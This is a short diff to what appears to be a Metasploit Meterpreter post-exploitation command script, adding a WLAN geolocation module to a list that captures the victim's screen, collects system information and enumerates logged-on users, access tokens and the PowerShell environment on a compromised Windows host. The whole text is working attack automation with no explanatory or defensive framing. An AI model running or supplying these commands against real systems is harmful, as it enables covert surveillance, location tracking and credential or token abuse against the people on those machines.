@@ -1,5 +1,6 @@
 sysinfo
 screenshot -v -p gather.jpeg -v true
+run post/multi/gather/wlan_geolocate
 run post/windows/gather/enum_logged_on_users
 run post/windows/gather/enum_tokens
 run post/windows/gather/enum_powershell_env
